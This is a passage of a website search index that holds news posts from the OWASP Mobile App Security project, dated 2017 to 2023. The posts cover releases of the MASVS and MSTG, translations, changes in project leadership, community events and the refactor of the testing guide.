</ul>","tags":[]},{"location":"news/2017/06/05/mobile-security-testing-workshop-on-the-owasp-summit-2017/","title":"Mobile Security Testing Workshop on the OWASP Summit 2017","text":"<p>The OWASP MSTG team is organizing a 5-days mobile security track on the OWASP Summit 2017. The track consists of a series of book sprints, each of which focuses on producing content for a specific section in the OWASP MSTG, as well as proof-reading and editing the existing content. The goal is to make as much progress on the guide as is humanly possible. Depending on the number of participants, we'll split into sub-groups to work on different subsections or topic areas.</p>","tags":[]},{"location":"news/2017/06/05/mobile-security-testing-workshop-on-the-owasp-summit-2017/#how-to-join","title":"How to Join","text":"<p>Join up for the working session(s) you like by following the link(s) on the mobile security track page, then hitting the \"Edit this page here\" link at the bottom, and adding yourself to the \"participants\" field. Signing up is not mandatory, but helps us to better organize the sessions. Don't worry though if your session of choice happens on the \"wrong\" day - you can always simply stop by and we'll brief you on your topic of choice. After all, this is the Woodstock of appsec!</p> <p>Mobile security track main page:</p> <p>http://owaspsummit.org/Working-Sessions/Mobile-Security/</p> <p>Mobile security track schedule:</p> <p>http://owaspsummit.org/schedule/tracks/Mobile-Security.html/</p>","tags":[]},{"location":"news/2017/06/17/the-owasp-mobile-security-testing-guide---summit-preview/","title":"The OWASP Mobile Security Testing Guide - Summit Preview","text":"<p>The MSTG Summit Preview is an experimental proof-of-concept book created on the OWASP Summit 2017 in London. The goal was to improve the authoring process and book deployment pipeline, as well as to demonstrate the viability of the project. Note that the content is not final and will likely change significantly in subsequent releases.</p>","tags":[]},{"location":"news/2017/07/05/sponsorship-packages-announced/","title":"Sponsorship Packages Announced","text":"<p>We are happy to announce that a limited amount of sponsorship packages will be made available shortly through our crowdfunding campaign. With these packages, we offer companies opportunities to create brand awareness and maximize visibility in the mobile security space. 100% of the funds raised go directly into the project budget and will be used to fund production of the final release.</p>","tags":[]},{"location":"news/2017/09/14/mobile-app-security-verification-standard-update/","title":"Mobile App Security Verification Standard Update","text":"<p>Version 0.9.4 of the MASVS is now available for download. This release contains several bug fixes and modifications to security requirements.</p>","tags":[]},{"location":"news/2018/01/13/mobile-app-security-verification-standard-release-10/","title":"Mobile App Security Verification Standard Release 1.0","text":"<p>Version 1.0 of the MASVS is now available for download. This release contains several bug fixes and modifications to security requirements and is our first release.</p>","tags":[]},{"location":"news/2018/06/15/mobile-security-testing-guide---release-10/","title":"Mobile Security Testing Guide - Release 1.0","text":"<p>The Mobile Security Testing Guide is now available for download in various formats. This is the first release of the MSTG and is a great community effort. We want to thank all contributors through this great journey. Thank you!</p>","tags":[]},{"location":"news/2018/06/16/jeroen-willemsen-joins-as-project-lead/","title":"Jeroen Willemsen joins as project lead","text":"<p>Jeroen Willemsen has joined as a project leader for the OMTG project.</p>","tags":[]},{"location":"news/2018/08/02/mobile-app-security-verification-standard-releases/","title":"Mobile App Security Verification Standard Releases","text":"<p>A lot has happened &amp; we are happy to announce that version 1.1 of the MASVS got released! Not just in English, but in Spanish and Russian as well. Want to know more? check the releases!. We would like to thank our Russian and Spanish speaking volunteers that have put quite some effort in translating the document! Lastly, we would like to announce that not all minor version releases will be in this news-section, unless something really important changed. Do you want to have the latest version of the MASVS? Just check Github!</p>","tags":[]},{"location":"news/2018/09/01/mobile-security-testing-guide-mentioned-in-nist-sp-163r1/","title":"Mobile Security Testing Guide mentioned in NIST SP-163r1","text":"<p>The Mobile Security Testing Guide is now reference in NIST SP 800-163 Revision 1.</p>","tags":[]},{"location":"news/2018/09/16/mstg-101-released/","title":"MSTG 1.0.1 released","text":"<p>The Mobile Security Testing Guide version 1.0.1 has been released using our automated release system (based on tagging). See the Release Notes for all the changes. We now have added pdf support and improved our .docx quiet a lot. We will further improve the release process for the pdf and epubs after milestone 1.1.0.</p>","tags":[]},{"location":"news/2018/09/21/masvs-automation-started/","title":"MASVS automation started","text":"<p>Now that the document generation process for the MSTG has been optimized enough for milestone 1.1.0 (and we reached #1000 in Github of issues and Pull requests), we have started to improve the MASVS releasing mechanism. This will be further improved after Appsec USA and the release of 1.1.0 of the MSTG.</p>","tags":[]},{"location":"news/2018/10/13/mstg-102-released--twitter-account/","title":"MSTG 1.0.2 released & Twitter account!","text":"<p>While working hard towards the 1.1.0 milestone of the MSTG, we released the 1.0.2 version. From now onward we have better PDF, Epub and Mobi files! We hope to port this to the MASVS after the Github release. We now have an official Twitter account: @OWASP_MAS!</p>","tags":[]},{"location":"news/2018/10/18/the-mstg-is-now-officially-an-owasp-lab-project/","title":"The MSTG is now officially an OWASP Lab Project","text":"<p>During AppSec US 2018 in San Jose the Mobile Security Testing Guide was reviewed by several volunteers to assess the maturity of the project. As a result our request for project graduation to lab status was granted. The reviews can be found here.</p> <p>Thanks to Harold Blankenship for organising the project review event during AppSec US and for pushing things forward for all the OWASP projects and of course to all people that took the effort to review our project!</p>","tags":[]},{"location":"news/2018/10/28/call-for-company-references/","title":"Call for Company References","text":"<p>We are looking for company references that are using or have used the OWASP-MSTG and/or MASVS. If you have done so and are ok with being mentioned: please email to sven.schleier@owasp.org.</p>","tags":[]},{"location":"news/2018/10/28/the-masvs-is-getting-more-translations/","title":"The MASVS is getting more translations","text":"<p>Thanks to Romuald, Koki and many others, new translations of the MASVS are popping up. We now have a Japanese translation added and the French, German and Persian translations are in development. Each of them will be released the moment our release-automation of the MASVS is completed. Until then: feel free to checkout the sources!</p>","tags":[]},{"location":"news/2018/11/30/release-110-of-the-mstg/","title":"Release 1.1.0 of the MSTG","text":"<p>We released the 1.1.0 version of the OWASP MSTG! Now all requirements of the MASVS have at least one covering testcase. We would like to thank all of our contributors for their hard work! Want to check it out? Check the releases!.</p>","tags":[]},{"location":"news/2019/01/03/multilanguage-release-112-of-the-masvs/","title":"Multilanguage Release 1.1.2 of the MASVS","text":"<p>We released the 1.1.2 version of the OWASP MASVS! This is the first version in Chinese, English, French, German, Japanese, Russian, and Spanish! Exactly: we just added French, German, Japanese and Chinese! Obviously this would not be possible without all the volunteers that helped us with translations, feedback, updating, and automating the release process! We are grateful for the awesome team that pulled this off! Want to see the result? Take a look at our release page!</p>","tags":[]},{"location":"news/2019/01/15/release-of-improved-checklist/","title":"Release of Improved Checklist","text":"","tags":[]},{"location":"news/2019/01/15/release-of-improved-checklist/#release-of-improved-checklist","title":"Release of Improved Checklist","text":"<p>We released a new version of the checklist! This version has adaptable references so that it can be used with newer versions of the MSTG as well. This version is currently available in French and English and we hope to add the Russian, Japanese, German and Spanish version soon! Want to know more? Take a look at our release page!. We would like to thank our volunteers for their effort to deliver these easy to use checklists!</p>","tags":[]},{"location":"news/2019/04/15/book-version-project-promotion--preparation-for-the-summit/","title":"Book Version, Project Promotion & Preparation for the Summit","text":"<p>Given that most news is already shared via OWASP Slack over the last quarter, we still see that it is good to share a summary of all of the good things outside of Slack using this news section. In this update we have a lot to share! While we started off this year with an improved version of the MASVS and MSTG, things have not been quiet: there has been a huge development in master of the MSTG and many issues have been raised and fixed. In the meantime, we have worked on an actual print of the book!</p> <p>While an early version is available through Hulu (no link supplied, google and buy at your own risk), we are working on making a better version of that book. In the mean time we have filed for a project promotion to Flagship! Next a lot more cool things happened: with the now official publication of NIST Special Publication (SP) 800-163 Revision 1, the MASVS and MSTG are getting more mainstream ;-).</p> <p>The MASVS &amp; MSTG are mentioned in various other upcoming programs/standards/recommendations as well, which is really a recognition of the hard work put in by the community. We are proud to be part of such a great project! Next, we are preparing to join the Open Security Summit again! Already three people will be on site, and at least one remote, but we would love to work with more people at the project again! Want to know more? Please get in touch via Slack and join the #project-mobile-app-security channel or follow us on Twitter.</p>","tags":[]},{"location":"news/2019/05/07/new-release-of-the-mstg/","title":"New Release of the MSTG","text":"<p>After many changes, we decided it was time to create a new release in order to improve the book version! Want to know more? Head over to the Github release page.</p>","tags":[]},{"location":"news/2019/05/21/new-release-of-the-mstg/","title":"New Release of the MSTG","text":"<p>As part of the preparations for the Open Security Summit, we have released a new version of the MSTG. Want to know more? Head over to the Github release page!</p>","tags":[]},{"location":"news/2019/06/05/new-release-of-the-masvs/","title":"New Release of the MASVS","text":"<p>As the summit is progressing, so are we! We have just released a new version of the MASVS (1.1.4). Want to know more? Head over to the Github release page!</p>","tags":[]},{"location":"news/2019/08/02/project-promoted-to-flagship-status/","title":"Project promoted to Flagship status!","text":"<p>We have been awarded Flagship status! We are very grateful and excited about this! We could not have done this without our team of awesome volunteers that have committed to the project, wrote issues, and supported us in many other ways. A special thanks goes out to OWASP and especially Harold Blankenship for facilitating us to function as a project and for leading the project review at OWASP Appsec Tel-Aviv! Thank you!</p>","tags":[]},{"location":"news/2019/08/04/oss-release/","title":"OSS Release!","text":"<p>After a lot of work, we finally have a new release of the MSTG! Want to know more? Head over to the Github release page.</p>","tags":[]},{"location":"news/2019/08/29/carlos-holguera-joins-the-leader-team/","title":"Carlos Holguera joins the leader team","text":"<p>We are happy to announce that Carlos Holguera joins us as an official MSTG Author and co-leader! With a team of 3 we hope to march further as that would make our lives easier given that all of this hard work is done by volunteers!</p>","tags":[]},{"location":"news/2019/09/06/flutter-experiment/","title":"Flutter Experiment","text":"<p>We have launched a react-native experiment based on our compliance checklist. Want to teach others how to validate React Native apps against the MASVS? Check this Google sheet!</p>","tags":[]},{"location":"news/2019/09/06/react-native-experiment/","title":"React Native Experiment","text":"","tags":[]},{"location":"news/2019/09/06/react-native-experiment/#react-native-experiment","title":"React native experiment!","text":"<p>We have launched a react-native experiment based on our compliance checklist. Want to teach others how to validate React Native apps against the MASVS? Check this Google sheet!</p>","tags":[]},{"location":"news/2019/09/17/xamarin-experiment/","title":"Xamarin Experiment","text":"<p>We have launched a react-native experiment based on our compliance checklist. Want to teach others how to validate React Native apps against the MASVS? Check this Google sheet!</p>","tags":[]},{"location":"news/2019/10/02/mstg-playground-release/","title":"MSTG Playground Release","text":"<p>Want more training apps? We hear you! We just released the MSTG-Android-Java &amp; MSTG-Android-Kotlin for Android and the MSTG-JWT app for iOS. Come and check it out at the release page! With special thanks to Sven Schleier (@sushi2k), Wen Bin Kong (@kongwenbin), Nikhil Soni (@nikhil), and Ryan Teoh (@ryantzj).</p>","tags":[]},{"location":"news/2019/10/02/mstg-project-joins-hacktoberfest/","title":"MSTG Project joins Hacktoberfest","text":"<p>We are joining the #hacktoberfest October 2-31. Check out our issues at Github. Register at https://hacktoberfest.digitalocean.com.</p>","tags":[]},{"location":"news/2019/10/04/pre-release-of-masvs-12/","title":"Pre-release of MASVS 1.2","text":"<p>We have a pre-release of MASVS Version 1.2. This will be the reference document for further translations.</p>","tags":[]},{"location":"news/2020/03/17/international-release-of-masvs-12/","title":"International release of MASVS 1.2","text":"<p>A new version of the OWASP Mobile Application Security Standard (MASVS) was released! The MASVS establishes baseline security requirements for mobile apps and summarizes them in one standard. With this new release we achieved a significant alignment and coverage with existing mobile security documents from ENISA, older NIST documents, OWASP Mobile top 10, and others. The new version 1.2 is available in Github Releases: https://github.com/OWASP/masvs/releases/tag/v1.2. For more details please look into our Release Notes for Version 1.2 and Version 1.2-RC https://github.com/OWASP/mastg/releases/tag/v1.2.</p> <p>Thanks to the great support of our community we have now 9 different languages available in total for the MASVS and would like to thank all of our translators for their great work and support throughout:</p> <ul> <li>Chinese (traditional) - Peter Chi, Lex Chien, Henry Hu and Leo Wang</li> <li>Chinese (simplified) - Bob Peng, Harold Zang and Jack S</li> <li>English - Jeroen Willemsen, Sven Schleier, Carlos Holguera and Jeroen Beckers</li> <li>French - Romuald Szkudlarek, Abderrahmane Aftahi and Christian Dong (Review)</li> <li>German - Rocco Gr\u00e4nitz and Sven Schleier</li> <li>Japanese - Koki Takeyama and Riotaro Okada (Review)</li> <li>Korean - Youngjae Jeon, Jeongwon Cho, Jiyou Han and Jiyeon Sung</li> <li>Russian - Eugen Martynov, Gall Maxim, Chelnokov Vladislav (Review), Oprya Egor (Review) and Tereshin Dmitry (Review)</li> <li>Spanish - Martin Marsicano and Carlos Holguera</li> </ul> <p>The MASVS and its translations are available in PDF, Mobile, ePub, docx and you can also read it via Gitbook. See here for details: https://github.com/OWASP/masvs/releases</p> <p>The project team (Sven Schleier, Jeroen Willemsen and Carlos Holguera) would like to thank all the contributors, translators and those who build the improved automation around it and all their hard work and support in the last few months! New releases will be much faster thanks to our GitHub actions and Docker containers. Next to that, we are happy to add Korean and Chinese Simplified to our ever growing list of translations! We will finalize the document generation system and then apply the same build system to the Mobile Security Testing Guide (MSTG) in order to speed up the release process and release more frequently.</p>","tags":[]},{"location":"news/2020/04/10/stayhome-and-share-your-knowledge/","title":"#StayHome and share your knowledge!","text":"<p>Hi everybody,</p> <p>we are all in more or less restrictive lock-down situations, but the guideline is always #StayHome. This is definitely a challenging time for you, but also us. But luckily it was also never easier to collaborate and share, through so many different tools and platforms.</p> <p>The OWASP Mobile Security Testing Guide (MSTG) project team wants to encourage people to #StayHome and also use this time to share your knowledge with the community. So if you want to either share your knowledge in mobile security or are just keen in doing some research in this area, we have many open issues where we are still looking for volunteers.</p> <p>If you can close 5 issues that we marked with the tag #StayHome we will sent you in return a hard copy of the OWASP MSTG! We are giving away a total of 5 books on a first come first serve basis.</p> <p>If you are interested, do the following:</p> <ol> <li> <p>Go through the open issues in our Github repo with the tag #StayHome.</p> </li> <li> <p>Make a comment on the issue that you would like to take care of, which will be assigned on a first come first serve basis. For any clarifications you can ping either Carlos or Sven in OWASP Slack. If you don't have an account yet, please check here on how to register.</p> </li> <li> <p>Work on the issue and create a Pull Request (PR). If you are new to Git(hub), check out our contribution guide for further details.</p> </li> <li> <p>We will review the PR and merge once all comments are addressed/resolved.</p> </li> <li> <p>Start at 1. :-)</p> </li> </ol> <p>We would love to have you as a contributor. Feel free to share the mail or like our tweet</p> <p>Stay safe, take care and #StayHome!</p> <p>Sven, Jeroen and Carlos</p>","tags":[]},{"location":"news/2020/05/23/new-build-system-and-release-upcoming/","title":"New build system and release upcoming!","text":"<p>As already shared during the virtual Dutch Chapter meetup: we are going to release a new version of the MSTG soon. We have been quite busy with moving it to the new build system first as the document got too large for our old tooling. This is a great incentive as well to think of how we can make the guide more focused so that the size does not matter ;-)</p> <p>More news on the new release will follow soon...</p>","tags":[]},{"location":"news/2021/11/17/from-slack-to-github-discussions/","title":"From Slack to GitHub Discussions","text":"<p>Hello everyone,</p> <p>times change, our project evolves and being able to hear you and discuss with you all is key for the OWASP MSTG project.</p> <p><code>TL;DR: we deprecate Slack in favor of GitHub Discussions as our primary communication channel.</code></p> <p>https://github.com/OWASP/mastg/discussions/ https://github.com/OWASP/masvs/discussions/</p>","tags":[]},{"location":"news/2021/11/17/from-slack-to-github-discussions/#removing-obstacles","title":"Removing obstacles","text":"<p>Until now we've driven all discussion on the MSTG Slack channel, to participate you had to get Slack, find the invite link (hope that it's still valid, else report it), go to our channel and post your question. It could really be a hurdle some times and some questions might be missed, there was also no way to up-vote them or keep track.</p> <p>All our contributors do have a GitHub account (or should! now you have a reason :) ). So, from today on we move to GitHub discussions and deprecate Slack as the primary communication channel. You can still reach us there for private messages though and we will try to relay the discussions to Slack ASAP, but just as notifications (no Q&amp;A over there).</p> <p>Discussions provides a place to bring all those conversations together right next to your code. Whether it's asking questions, sharing announcements, or featuring important information, it's all in one place and easily accessible to contributors and community members alike.</p>","tags":[]},{"location":"news/2021/11/17/from-slack-to-github-discussions/#separation","title":"Separation","text":"<p>We want to separation regarding actionable things to do (issues) and ideas/proposals (now \"Ideas\" Discussion). Having it all in GitHub makes it sooo much easier for us to manage, reference, etc.</p> <p>Think of it this way: Discussions are for talking and GitHub Issues are for doing. This helps minimize distractions, keep teams on track, and address topics and questions clearly in a dedicated forum. Plus, you can move seamlessly between the two as well by converting an issue to a discussion and vice versa with a simple click.</p>","tags":[]},{"location":"news/2021/11/17/from-slack-to-github-discussions/#insights","title":"Insights","text":"<p>Soon we will be able to see insights regarding the discussions. You guessed it, we'll take that into account and acknowledge your contribution to the discussions as we do with the content itself. More details on this once we can test the feature.</p>","tags":[]},{"location":"news/2021/11/17/from-slack-to-github-discussions/#roadmap","title":"Roadmap","text":"<ul> <li>[X] Deprecate Slack</li> <li>[X] Relay Discussions to Slack</li> <li>[X] Discussion contribution acknowledgement info</li> </ul>","tags":[]},{"location":"news/2021/11/17/from-slack-to-github-discussions/#be-sure-to-subscribe","title":"Be sure to subscribe","text":"<p> or: </p> <p>For this announcement we partially mapped this nice GitHub article to our project (recommended read): https://github.blog/2021-11-10-7-unique-software-collaboration-features-in-github-discussions/</p>","tags":[]},{"location":"news/2022/02/07/nist-800-218---recommendations-for-mitigating-the-risk-of-software-vulnerabilities/","title":"NIST 800-218 - Recommendations for Mitigating the Risk of Software Vulnerabilities","text":"<p>We're happy to share the new NIST 800-218 (Feb 2022) mapping to the latest MASVS v1.4.2 (Jan 2022) especially MASVS-ARCH and MASVS-CODE:</p> <p>\"Secure Software Development Framework (SSDF) v1.1: Recommendations for Mitigating the Risk of Software Vulnerabilities\"</p>","tags":[]},{"location":"news/2022/08/23/project-rebranding-to-owasp-mas/","title":"Project Rebranding to OWASP MAS","text":"<p>Until now our project was called the \"OWASP Mobile Security Testing Guide (MSTG)\" project. Unfortunately, this was a source of confusion since we happen to have a resource with the same name, the OWASP MSTG. Not only that, that name doesn't reflect the full scope and reach of our project. Have you ever wondered why the MSTG is called MSTG and not MASTG? Both documents are about Mobile Application Security and we'd like to make that clear.</p> <p>Today we are rebranding our project to \"OWASP Mobile App Security (MAS)\".</p> <p>The OWASP MAS project includes:</p> <ul> <li>OWASP MASVS -&gt; MAS Verification Standard</li> <li>OWASP MASTG -&gt; MAS Testing Guide</li> <li>OWASP MAS Checklists</li> <li>OWASP MAS Crackmes (incl. Hacking playground)</li> </ul>","tags":[]},{"location":"news/2023/04/01/masvs-v200-release/","title":"MASVS v2.0.0 Release","text":"<p>We are thrilled to announce the release of the new version of the OWASP Mobile Application Security Verification Standard (MASVS) v2.0.0. With this update, we have set out to achieve several key objectives to ensure that MASVS remains a leading industry standard for mobile application security.</p> <ul> <li>Keep Abstraction: we have worked hard to maintain the level of abstraction that has made MASVS so valuable in the past. We leave the details to the MASTG.</li> <li>Simplify: we have simplified the MASVS by removing redundancies and overlaps in the security controls. This will make it easier for users to understand the standard and implement it effectively in their own projects.</li> <li>Bring Clarity: we have worked hard to use standard terminology wherever possible, drawing on established sources such as NIST-SP 800-175B and NIST OSCAL, as well as well-known and used sources such as CWEs, Android Developer Docs, and Apple Docs.</li> <li>Narrow Scope: we have narrowed the scope of MASVS to rely more heavily on other industry standards such as the OWASP ASVS, OWASP SAMM and NIST.SP.800-218 SSDF v1.1. This will ensure that MASVS remains relevant and up-to-date in a rapidly evolving landscape of mobile application security.</li> </ul> <p>We believe that these changes will make the OWASP MASVS v2.0.0 an even more valuable resource for developers and security practitioners alike, and we are excited to see how the industry embraces these updates.</p> <p>The MASVS v2.0.0 was presented at the OWASP AppSec Dublin 2023, you can watch the presentation \u25b6\ufe0f here.</p>","tags":[]},{"location":"news/2023/04/01/masvs-v200-release/#why-are-there-no-levels-in-the-new-masvs-controls","title":"Why are there no levels in the new MASVS controls?","text":"<p>The Levels you already know (L1, L2 and R) will be fully reviewed and backed up with a corrected and well-documented threat model.</p> <p>Enter MAS Profiles: We are moving the levels to the MASTG tests so that we can evaluate different situations for the same control (e.g., in MASVS-STORAGE-1, it's OK to store data unencrypted in app internal storage for L1, but L2 requires data encryption). This can lead to different tests depending on the security profile of the application.</p>","tags":[]},{"location":"news/2023/04/01/masvs-v200-release/#transition-phase","title":"Transition Phase","text":"<p>The MASTG, in its current version v1.5.0, currently still supports the MASVS v1.5.0. Bringing the MASTG to v2.0.0 to be fully compatible with MASVS v2.0.0 will take some time. That's why we need to introduce a \"transition phase\". We're currently mapping all new proposed test cases to the new profiles (at least L1 and L2), so even if the MASTG refactoring is not complete, you'll know what to test for, and you'll be able to find most of the tests already in the MASTG.</p> <ul> <li>Map the current MASTG tests to the new MASVS v2.0.0.</li> <li>Assign profiles to the proposed MASTG atomic tests (at least L1, L2 and R).</li> </ul>","tags":[]},{"location":"news/2023/04/01/masvs-v200-release/#special-thanks","title":"Special Thanks","text":"<p>We thank everyone that has participated in the MASVS Refactoring. You can access all Discussion and documents for the refactoring here.</p> <p>You'll notice that we have one new author in the MASVS: Jeroen Beckers</p> <p>Jeroen is a mobile security lead responsible for quality assurance on mobile security projects and for R&amp;D on all things mobile. Ever since his master's thesis on Android security, Jeroen has been interested in mobile devices and their (in)security. He loves sharing his knowledge with other people, as is demonstrated by his many talks &amp; trainings at colleges, universities, clients and conferences.</p> <p>\ud83d\udc99 Special thanks to our MAS Advocate, NowSecure, who has once again demonstrated their commitment to the project by continuously supporting it with time/dedicated resources as well as feedback, data and content contributions.</p>","tags":[]},{"location":"news/2023/05/08/masvs-v2-colors/","title":"MASVS v2 Colors","text":"<p>We're bringing official colors to the MASVS! The new colors will be used across the MASVS v2.0.0 and MASTG v2.0.0 to help users quickly identify the different control groups. We've also revamped certain areas of our website to make them more readable and easier to navigate as well as to prepare for what's coming with the MASTG v2.0.0 (keyword: \"atomic tests\").</p>","tags":[]},{"location":"news/2023/05/08/masvs-v2-colors/#masvs","title":"MASVS","text":"<p>In the MASVS home page, the new colors will be used to highlight the different control groups.</p> <p>The individual controls will also be color-coded to help users quickly identify the different control groups. We've also redesigned the control pages to make them more readable and easier to navigate.</p>","tags":[]},{"location":"news/2023/05/08/masvs-v2-colors/#mastg","title":"MASTG","text":"<p>Now, when you navigate to the MASTG tests, you'll see that they are categorized by platform (Android/iOS) as well as by MASVS category, also using our new colors in the sidebar. The colors will also be used to highlight the different control groups in the test description.</p> <p>Each test now contains a header section indicating the platform, the MASVS v1.5.0 controls, and the MASVS v2.0.0 controls.</p> <p>We've also introduced a new section called \"Resources\" which is automatically generated using the inline links within the MASTG pages and serve as a quick reference to the most important resources for each test.</p> <p>NOTE: The MASTG tests themselves haven't changed yet, we're still working on the refactoring. For now we've simply split the tests into individual pages to make them easier to navigate and reference. This will facilitate the work on the refactoring and the introduction of the new atomic tests.</p>","tags":[]},{"location":"news/2023/05/08/masvs-v2-colors/#mas-checklist","title":"MAS Checklist","text":"<p>The MAS Checklist pages and the MAS checklist itself have also been updated to use the new colors to highlight the different control groups and to make them easier to navigate.</p> <p>When you click on a MASVS group you'll see a table listing the new MASVS v2.0.0 controls as well as the corresponding MASTG tests (v1.5.0) for both the Android and the iOS platforms.</p> <p>NOTE: The checklist contains the old MASVS v1 verification levels (L1, L2 and R) which we are currently reworking into \"security testing profiles\". The levels were assigned according to the MASVS v1 ID that the test was previously covering and might differ in the upcoming version of the MASTG and MAS Checklist.</p> <p>For the upcoming of the MASTG version we will progressively split the MASTG tests into smaller tests, the so-called \"atomic tests\" and assign the new MAS profiles accordingly.</p> <p></p> <p>We hope you like the new colors and the changes we've made to the website. We're looking forward to your feedback! Please use our GitHub Discussions to post any questions or ideas you might have. If you see something wrong please let us know by opening a bug issue.</p>","tags":[]},{"location":"news/2023/07/28/mas-testing-profiles-and-mastg-atomic-tests/","title":"MAS Testing Profiles and MASTG Atomic Tests","text":"<p>The MASTG refactoring is a significant upgrade that addresses some existing challenges and introduces exciting new features. It aims to streamline compliance, simplify testing and improve usability for security testers and other stakeholders.</p>","tags":[]},{"location":"news/2023/07/28/mas-testing-profiles-and-mastg-atomic-tests/#mas-testing-profiles","title":"MAS Testing Profiles","text":"<p>As part of the MASVS refactoring, we've replaced the three traditional verification levels (L1, L2, and R) with security testing profiles in the MASTG. These new profiles are designed to enhance our ability to capture various security nuances associated with mobile apps, allowing us to evaluate different situations for the same MASVS control. For instance, in MASVS-STORAGE-1, it's acceptable to store data unencrypted in app internal storage for MAS-L1, but MAS-L2 requires data encryption.</p> <p>The new MAS Testing Profiles include revamped versions of the traditional levels and one new addition:</p> <p>Another interesting addition we're exploring for the near future is a 'Privacy' profile, which would focus on tests that consider the privacy implications of various app features and functionalities. We believe that this profile can become an essential tool in an era where privacy has become a significant concern.</p> <p>HELP WANTED: Today we're releasing the new MAS Testing Profiles and would love to hear what you think. Please give your feedback here until the 31st of August 2023.</p>","tags":[]},{"location":"news/2023/07/28/mas-testing-profiles-and-mastg-atomic-tests/#atomic-tests","title":"Atomic Tests","text":"<p>One of the key changes in the MASTG refactoring is the introduction of the new MASTG Atomic Tests. The existing tests are currently quite large and often cover more than one MASVS control. With the introduction of Atomic Tests, we'll break these tests down into smaller, more manageable pieces. Our goal is to make these tests as self-contained and specific as possible to allow for reduced ambiguity, better understanding and easier execution. Each atomic test will have its unique ID for easy reference and traceability and will be mapped to the relevant controls from the MASVS.</p> <p>But before we can start writing the new atomic tests, we need to finalize the proposal for the new MASTG Atomic Tests including mappings to the MASVS controls and the new MAS Testing profiles.</p> <p>HELP WANTED: Today we're releasing the new MASTG Atomic Tests Proposal and would love to hear what you think. Please give your feedback here until the 31st of August 2023.</p>","tags":[]},{"location":"news/2023/07/28/mas-testing-profiles-and-mastg-atomic-tests/#whats-next","title":"What's Next?","text":"<p>We are now in the process of transforming the MASTG, according to the changes highlighted above. We've already released the MASVS v2.0.0, and the rest of the year will be dedicated to the MASTG refactoring, which will involve creating hundreds of new tests. We believe these changes will significantly improve the usability and relevance of the MASTG. We're excited to keep you updated on our progress and look forward to your continued support and feedback.</p> <p>We would like to extend a special thanks to our MAS Advocate NowSecure. Their commitment to the OWASP project is not merely financial; it's an investment of their most valuable resource \u2013 their people and their time. NowSecure has dedicated hours of expertise, extensive knowledge, and hard work towards making these changes a reality.</p> <p>Would you like to become a MAS Advocate? Contact us to learn more.</p> <p>A huge thanks goes of course to our wider community and all of our contributors. Your continuous participation and input have been instrumental in the evolution of the OWASP MAS project. It is through this collaborative effort that we can truly advance in the field of mobile app security. Thank you for being a part of this journey!</p>","tags":[]},{"location":"news/2023/09/20/request-for-community-review-new-risk-assessment-formula-for-mobile-applications/","title":"Request for Community Review: New Risk Assessment Formula for Mobile Applications","text":"","tags":[]},{"location":"news/2023/09/20/request-for-community-review-new-risk-assessment-formula-for-mobile-applications/#sep-20th-2023-request-for-community-review-new-risk-assessment-formula-for-mobile-applications","title":"Sep 20th, 2023: Request for Community Review: New Risk Assessment Formula for Mobile Applications","text":"<p>We are excited to announce the release of a new collaborative effort between industry, academia, and the OWASP Mobile Application Security (MAS) project. This document introduces a novel formula designed to measure the risk associated with mobile applications.</p> <p></p> <p>Document Highlights:</p> <ul> <li>The formula is grounded in the industry standard Mobile Application Security Verification Standard (MASVS).</li> <li>It calculates risk based on the probability of an application being compromised and the potential impact of such a compromise.</li> <li>The document also explores the possibility of a more nuanced risk assessment using the Mobile Application Security Testing Guide (MASTG) tests.</li> <li>We provide a high-level walkthrough of the formula's application to individual apps as well as its extension to a device-level risk scoring, with a special focus on preloaded applications.</li> <li>Lastly, the document discusses potential future enhancements like the inclusion of dynamic industry data and severity scaling factors with the intention of publishing an academic paper.</li> </ul> <p>Call to Action:</p> <p>We invite you to review the document and share your comments, feedback, and suggestions. Your insights are invaluable to us and will contribute significantly to the final version.</p> <p>Review Timeline: until October 31, 2023</p> <p>Please follow the link here to access the document: https://docs.google.com/document/d/1dnjXoHpVL5YmZTqVEC9b9JOfu6EzQiizZAHVAeDoIlo/edit?usp=sharing</p> <p>By collaborating on this initiative, we aim to provide a structured and flexible framework for risk assessment that assists organizations and individuals in making informed security decisions. We look forward to your active participation and valuable feedback!</p>","tags":[]},{"location":"news/2023/09/29/mastg-refactor-part-2---techniques-tools--reference-apps/","title":"MASTG Refactor Part 2 - Techniques, Tools & Reference Apps","text":"<p>We are thrilled to announce the second phase of the MASTG (Mobile Application Security Testing Guide) refactor. These changes aim to enhance the usability and accessibility of the MASTG.</p> <p>The primary focus of this new refactor is the reorganization of the MASTG content into different components, each housed in its dedicated section/folder and existing now as individual pages in our website (markdown files with metadata/frontmatter in GitHub):</p> <ul> <li> <p>Tests:</p> <ul> <li>Website: Tests section.</li> <li>GitHub: <code>tests/</code> folder.</li> <li>Identified by IDs in the format <code>MASTG-TEST-XXXX</code>.</li> <li>Includes all tests originally in:<ul> <li>0x05d/0x06d-Testing-Data-Storage.md</li> <li>0x05e/0x06e-Testing-Cryptography.md</li> <li>0x05f/0x06f-Testing-Local-Authentication.md</li> <li>0x05g/0x06g-Testing-Network-Communication.md</li> <li>0x05h/0x06h-Testing-Platform-Interaction.md</li> <li>0x05i/0x06i-Testing-Code-Quality-and-Build-Settings.md</li> <li>0x05j/0x06j-Testing-Resiliency-Against-Reverse-Engineering.md</li> </ul> </li> <li> IMPORTANT (TODO): These tests are still the original MASTG v1.6.0 tests. We will progressively split them into smaller tests, the so-called \"atomic tests\" in MASTG v2 and assign the new MAS profiles accordingly.</li> </ul> </li> <li> <p>Techniques:</p> <ul> <li>Website: Techniques section.</li> <li>GitHub: <code>techniques/</code> folder.</li> <li>Identified by IDs in the format <code>MASTG-TECH-XXXX</code>.</li> <li>Includes all techniques originally in:<ul> <li>0x05b/0x06b-Basic-Security_Testing.md</li> <li>0x05c/0x06c-Reverse-Engineering-and-Tampering.md</li> </ul> </li> </ul> </li> <li> <p>Tools:</p> <ul> <li>Website: Tools section.</li> <li>GitHub: <code>tools/</code> folder.</li> <li>Identified by IDs in the format <code>MASTG-TOOL-XXXX</code>.</li> <li>Includes all tools from:<ul> <li>0x08a-Testing-Tools.md</li> </ul> </li> </ul> </li> <li> <p>Apps:</p> <ul> <li>Website: Apps section.</li> <li>GitHub: <code>apps/</code> folder.</li> <li>Identified by IDs in the format <code>MASTG-APP-XXXX</code>.</li> <li>Includes all apps from:<ul> <li>0x08b-Reference-Apps.md</li> </ul> </li> </ul> </li> </ul> <p>We hope that the revamped structure enables you to navigate the MASTG more efficiently and access the information you need with ease.</p>","tags":[]},{"location":"news/2023/10/10/masvs-privacy/","title":"MASVS-PRIVACY","text":"<p>Mobile applications frequently access 